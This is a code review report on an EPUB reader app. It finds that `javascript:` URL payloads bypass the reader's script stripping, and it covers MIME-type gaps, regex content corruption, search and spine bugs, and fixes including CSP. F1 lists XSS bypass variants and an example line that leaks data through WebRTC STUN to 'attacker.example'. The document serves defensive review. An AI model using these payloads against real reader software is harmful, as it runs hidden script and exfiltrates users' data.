# Full Codebase Review — 2026-09-26

**Outcome: NOT READY for another "scripts stripped / no network" claim.** Script execution is still reachable from book content with no user interaction. There are 9 confirmed defects: 1 high, 4 medium, 4 low. Nits are listed separately.

| | |
|---|---|
| Repository | `greenyogainc/epub-lite-reader` @ `b48f03b` (`main`, release 1.0.6 + submission pack) |
| Scope | All maintained source (`src/EpubLiteReader/*.cs`, XAML code-behind), the test project, `tools/EpubSmoke`, `packaging/Build-Msix.ps1`, `Package.appxmanifest`, and the README/store-listing claims. Prior reports (`2026-09-03`, `2026-09-24`, `2026-09-24-release-1.0.6`) were read first, so their fixed, refuted, or accepted items are not re-reported. |
| Method | Manual review. Behavioral claims were checked in real Chromium (Playwright build 1194, `--headless=new`), with the reader's own `BuildDocumentCreatedScript()` injected verbatim. Chromium's extension→MIME table was read from `net/base/mime_util.cc`, and VersOne.Epub 3.3.6 source was read at tag `v3.3.6`. |
| Not run | `dotnet build/test` needs a Windows host (WPF, `net10.0-windows`). Nothing in this report depends on it. Two WebView2-specific points are marked **[WV2 probe]**. `review-probe.epub` (see the end of this report) confirms them in about a minute. |

## Findings

| ID | Sev | Location | Defect | Status |
|---|---|---|---|---|
| F1 | **high** | `EpubDoc.StripScripts`, `ReaderInject` click guard | `javascript:` URLs are not sanitized anywhere. `<iframe src="javascript:…">` runs with **no interaction**. Six clickable variants get past the click guard. | Confirmed in Chromium. Host-filter bypass: [WV2 probe] |
| F2 | medium | `EpubDoc` `MarkupExtensions` / `PassiveExtensions` | The extension lists don't match Chromium's MIME table. A byte entry named `*.shtm` / `*.ehtml` is served as `text/html` and written unsanitized. Passive font/audio extensions with no MIME mapping can be HTML-sniffed. | Confirmed against `mime_util.cc`. Served type: [WV2 probe] |
| F3 | medium | `EpubDoc.EventAttrRegex` | The event-handler pass runs over text, not just tags. It deletes code-sample text (`int one = 1;` → `int `) and can eat closing tags, which breaks XHTML well-formedness. Everything after the error disappears. | Confirmed (regex + Chromium XHTML render) |
| F4 | medium | `ReaderInject.__elrFind`, `MainWindow.RunSearchAsync` | In-page find uses `wrapAround=true`. Once the current chapter has a hit, Find Next cycles inside that chapter forever and never reaches other chapters. | Confirmed in Chromium |
| F5 | medium | `EpubDoc.GetSpineUrl`, `WriteContinuousDocument` | Spine paths go into URLs unescaped. VersOne returns decoded paths, so a chapter file containing `#`, `?`, or `%` (e.g. `C#.xhtml`) 404s in every view mode. | Confirmed by code + VersOne source |
| F6 | low | `MainWindow.GoToSpineAsync` | An EPUB with an empty `<spine/>` opens "successfully". After that, every Next/Home/End/page-box/TOC action throws `ArgumentException` from `Math.Clamp(x, 0, -1)` and shows the unhandled-error dialog. | Confirmed (VersOne accepts an empty spine) |
| F7 | low | `EpubDoc` extract root, `App.LogError` | Orphaned `%TEMP%\EpubLiteReader\<guid>` extracts are never swept, and `EpubLiteReader.log` grows without bound. | Confirmed by code |
| F8 | low | `packaging/Build-Msix.ps1` | A missing `signtool.exe` dereferences `$null` and fails with an opaque error. Nothing checks that csproj `<Version>` matches the manifest `Version`. | Confirmed by code |
| F9 | low | `BookStateStore` load path | `FontScale` / `LineHeight` / `MarginEm` are clamped only when the UI changes them, never on load. | Confirmed by code |

---

### F1 — `javascript:` URLs bypass both script defenses (high)

**What happens.** `StripScripts` removes `<script>`, `on*=` attributes, network-hint links, and XSLT PIs. It never looks at URL-bearing attributes. The injected click guard is the only other layer. It only inspects `closest('a[href]')` and tests the raw attribute with `/^[a-z][a-z0-9+.-]*:/i`. Anything that regex doesn't recognize as a scheme is let through as "relative".

Results in Chromium, with the reader's inject script installed:

| Payload | Interaction | Executes |
|---|---|---|
| `<a href="javascript:…">` (baseline) | click | no (guard works) |
| `<iframe src="javascript:…">` | **none** | **yes** |
| `<a href=" javascript:…">` (leading space; URL parser strips it) | click | yes |
| `<a href="java&#9;script:…">` (tab; URL parser strips it) | click | yes |
| SVG `<a xlink:href="javascript:…">` (no `href` attr, so `closest('a[href]')` misses it) | click | yes |
| `<area href="javascript:…">` (not an `<a>`) | click | yes |
| `<form action="javascript:…">` / `<button formaction="javascript:…">` | click | yes |

**Why the host filters don't catch it [WV2 probe].** Chromium runs `javascript:` URLs in the renderer, with no browser-side `NavigationRequest`. `NavigationStarting`, `FrameNavigationStarting`, and `WebResourceRequested` are all browser-side hooks, so none of them should see these URLs. `ReaderUriTests` covers `javascript:` only in the predicate, which proves nothing about whether the event fires.

**Impact.** This falsifies two claims in the README and in every store-listing language: "scripts embedded in EPUB files are stripped" and "book content can make no network request at all". Script on `epub.local` can reach the host message channel (validated types only, so the damage there is nuisance: forced page turns, fullscreen toggles). The bigger problem is that it can use egress that never goes through `WebResourceRequested`. The obvious route is WebRTC ICE: `new RTCPeerConnection({iceServers:[{urls:'stun:<data>.attacker.example'}]})` leaks the user's IP and arbitrary data through DNS and a UDP STUN request. Whether WebSocket goes through the filter should also be checked on the same probe.

**Fix (structural — recommended).** Stop serving through `SetVirtualHostNameToFolderMapping`. Serve `https://epub.local/*` from `OnWebResourceRequested` yourself, with:

- `Content-Security-Policy: default-src 'none'; script-src 'none'; object-src 'none'; form-action 'none'; base-uri 'none'; img-src https://epub.local data:; style-src https://epub.local 'unsafe-inline'; font-src https://epub.local; media-src https://epub.local; frame-src https://epub.local`. With `script-src 'none'`, CSP blocks `javascript:` navigations, inline handlers, and `<script>`. The initial `about:blank` of a child iframe inherits the parent's policy, so `iframe src=javascript:` is blocked too.
- The continuous document gets the same policy, except `script-src 'sha256-<hash of its inline script>'`, computed in `WriteContinuousDocument`.
- An explicit `Content-Type` from an allowlist keyed on extension (unknown → `application/octet-stream`), plus `X-Content-Type-Options: nosniff`. This also closes F2.
- A path resolve that reuses `TryMapToDisk`'s containment check. Serve `Range` requests if audio/video seeking matters.

Two things to verify on Windows before relying on this, the same caveat the 1.0.6 report raised. First, `AddScriptToExecuteOnDocumentCreatedAsync` and `ExecuteScriptAsync` must still run under a page CSP of `script-src 'none'`. They are CDP-injected and should be exempt. Second, `window.chrome.webview.postMessage` must still work from the injected script. The regex sanitizer then becomes defense-in-depth rather than the primary control. After three review rounds of regex bypasses, that is the right posture.

**Fix (tactical, if a patch has to ship first).** Harden the click guard: resolve with `new URL(el.href.baseVal ?? el.href, location)`, cover `a, area` plus SVG `a` via `ev.composedPath()`, and add a capture-phase `submit` listener that checks `ev.submitter?.formAction ?? form.action`. That still leaves `iframe src=javascript:` and SVG `<animate>`/`<set>` targeting `href`. Only a sanitizer pass or CSP closes those, which is why the tactical fix alone is not enough.

**Tests.** A sanitizer test that each payload above is neutralized. A WebView2 integration check with the probe EPUB (automatable through the existing `--statefile` harness).

### F2 — extension lists vs. Chromium's MIME table (medium)

`mime_util.cc` maps `shtm` → `text/html` and `xhtm` → `application/xhtml+xml`. Both are primary mappings, so they override the platform. `ehtml` → `text/html` and `xbl` → `text/xml` are secondary. None of these are in `MarkupExtensions`. Take a byte entry (declared e.g. `image/png`) named `evil.shtm` whose content starts with any non-`<` byte (`x<script>…`). It isn't passive, isn't markup by extension, isn't declared html-like, and fails `LooksLikeMarkup`. So it is written raw and served as HTML, where a leading text byte doesn't matter. A chapter `<iframe src="evil.shtm">` runs it with no click.

The opposite side has the same kind of gap. `ttf`, `otf`, `woff2`, `eot`, and `aac` are in `PassiveExtensions` but appear in neither of Chromium's tables, so their type depends on the Windows registry. An empty type is MIME-sniffed, and a `.eot` whose content is `<html><script>…` would sniff as HTML. The passive branch never runs `LooksLikeMarkup`.

**Fix.** The F1 structural fix (explicit type plus `nosniff`) closes this completely. Independently: add `.shtm .xhtm .ehtml .xbl .xul .rdf .rss` to `MarkupExtensions`, and run `LooksLikeMarkup` on passive-extension bytes too, sanitizing or skipping on a hit. Real images, fonts, and media never start with `<`, and the check costs O(leading whitespace).

### F3 — event-handler pass corrupts content (medium)

`EventAttrRegex` is applied to the whole document. Its lookbehind accepts whitespace, and its unquoted-value branch `[^\s>]+` runs up to the next `>`. Checked:

```
<pre><code>int one = 1;
bool online = false;
var onTimeout = cb;</code></pre>
→ <pre><code>int
bool
var ></pre>
```

The last line removed `cb;</code`. In an XHTML chapter (XML-parsed), that tag mismatch makes Chromium show "This page contains the following errors…", and **the rest of the chapter is not rendered**. Prose is hit too: "Set only = true" loses `only = true`. The search index goes through the same function (`HtmlToPlainText` → `StripScripts`), so those words also become unsearchable. Programming books are a mainstream EPUB category.

**Fix.** Run the handler removal only inside start tags. Match tags quote-aware, the way `LinkTagRegex` already does (`<[A-Za-z][\w:.-]*(?:[^>"']|"[^"]*"|'[^']*')*>`), then apply `EventAttrRegex` within each match. The splice-proof ordering argument in the `StripScripts` doc comment still holds: the handler pass stays last, and a tag match can't grow past its own `>`. Add regression tests for the snippet above, including a well-formedness assertion on XHTML output.

### F4 — search never leaves the current chapter (medium)

`__elrFind` calls `window.find(q, false, !forward, /*wrap*/ true, …)`. Checked in Chromium on `<p>foo one.</p><p>foo two.</p>`: five calls return `true` five times, alternating between the two hits. `RunSearchAsync` only falls back to the book index when that returns `false`, which can't happen while the current chapter has a match. Once an index jump lands you in chapter N, every later Enter stays in N. With `wrap=false` Chromium correctly returns `true, true, false`. Separately, the index path starts at hit 0 (`_searchHitIndex = -1` → `0`) instead of the first hit after the current spine.

**Fix.** Use `wrap=false` in `__elrFind`. When it returns `false`, pick the next index hit with `SpineIndex > current` (or `<` for backward, wrapping at the book's ends), rather than `_searchHitIndex ± 1`.

### F5 — unescaped spine URLs (medium)

VersOne unescapes every manifest href (`PackageReader.cs:166`, `Uri.UnescapeDataString`), so `FilePath` is the decoded zip entry name. `GetSpineUrl` builds `https://epub.local/{path}`, and the continuous document writes `data-src="/{path}"` with HTML-attribute escaping only. A chapter `OEBPS/C#.xhtml` (href `C%23.xhtml`) requests `/OEBPS/C`, and `100%.xhtml` produces an invalid percent escape. Either way the result is a blank pane in every mode.

**Fix.** Percent-encode per segment: `string.Join('/', path.Split('/').Select(Uri.EscapeDataString))`, in both places. Add a unit test on `GetSpineUrl` for `#`, `?`, `%`, space, and non-ASCII.

A related upstream note: VersOne also unescapes nav hrefs **before** splitting off the anchor (`UrlParser`), so the TOC entry for `C%23.xhtml` parses as file `C` with anchor `.xhtml` and can't be navigated. That is not this repo's bug, but it is worth an upstream issue.

### F6 — empty spine (low)

`<spine/>` parses without error in VersOne 3.3.6: only malformed `itemref`s throw. `OpenFileAsync` commits the book, the first navigation throws inside the pump (`GetSpineUrl(0)` → `ArgumentOutOfRangeException`, logged), and the pane keeps showing the previous book, whose extract root was just deleted. After that, `GoToSpineAsync` hits `Math.Clamp(spine, 0, -1)` → `ArgumentException` on every navigation input, and each one raises the unhandled-error dialog. **Fix:** reject `book.ReadingOrder.Count == 0` inside `OpenWithChaptersCoreAsync`, before the commit point, with a localized "no readable content" message. Also guard `GoToSpineAsync` with `SpineCount == 0`.

### F7 — temp and log hygiene (low)

Extract roots are deleted only by `Dispose`. After a crash, a kill, or a `Directory.Delete` that fails because the WebView still holds handles at `Window_Closing`, a full decompressed copy of the book stays in `%TEMP%` indefinitely. **Fix:** at startup, sweep `%TEMP%\EpubLiteReader\*` directories older than about a day (age-based, since multiple instances are allowed). Roll `EpubLiteReader.log` at a size cap, e.g. rename to `.1` above 1 MB.

### F8 — `Build-Msix.ps1` (low)

`$signtool` isn't null-checked the way `$makeappx` is. Add a guard that fails when csproj `<Version>` (1.0.6) and manifest `Identity/@Version` (1.0.6.0) differ. That enforces the CLAUDE.md release rule mechanically instead of relying on memory.

### F9 — persisted display values not clamped on load (low)

The UI clamps font scale to [0.7, 2.5], line height to [1.1, 2.4], and margins to [0.4, 3.0], but `LoadAppSettings` and `NormalizeBook` accept any finite number. A hand-edited or corrupted file with `"fontScale": 1000` renders unreadably until the user resets it. **Fix:** apply the same clamps in `NormalizeBook` and after `LoadAppSettings`.

## Nits (no action required)

- `ReadingHost.RaiseBlockedNavigation` posts `blocked-nav`, but `MainWindow.OnHostMessage` has no case for it. Either surface it (status text such as "External link blocked") or delete it.
- `WriteAtomic` is safe against a process crash, not a power loss: there's no `Flush(true)` before the rename. It's cheap to add with a `FileStream`.
- `ComputeBookId` includes the full path, so moving or renaming a book loses its position and bookmarks. That's a reasonable choice, but it isn't documented anywhere.

## Checked and fine

Path containment in `TryMapToDisk` (rooted paths, `..`, ADS `:`, device names, trailing dot/space, the continuous-file name). Web-message validation (`TryParseMessage`: type allowlist, finite and clamped numbers, key allowlist). `Source` gating on the message channel. Script-argument construction: `JsonSerializer.Serialize` for queries (the default encoder escapes `<>&'` and non-ASCII) and invariant-culture numbers. `OpenFileAsync` commit/dispose ordering after the 1.0.6 fixes. The `NonBacktracking` coverage. The support WebView's exact-host HTTPS allowlist and the user-initiated-only external open. The About teardown paths.

## Suggested order

1. **F1 structural** (serve with CSP + `nosniff`), which also closes **F2**. Until it ships, keep the store listing's "no network / scripts stripped" wording out of the next What's-new.
2. **F3** and **F4**: user-visible correctness, each a small change with tests.
3. **F5**, **F6**: one-liners plus tests.
4. **F7**–**F9** and the nits.

## Windows probe

`tools/make_review_probe_epub.py` (attached) builds `review-probe.epub`. Every probe only rewrites a marker `<span>` in the book's own page: no network, no host messages. Expected on 1.0.6:

- `m1` (iframe) and `m2` (`evil.shtm`) read **EXECUTED** on open (F1, F2).
- `c1`–`c5` read **EXECUTED** after clicking. `c0` stays "not run".
- Section 3 ends in Chromium's XML error banner (F3).
- **Next** to chapter 2 (`C#.xhtml`) gives a blank pane (F5).

After the fixes, every marker should stay "not run", the code sample should be intact, and chapter 2 should render.
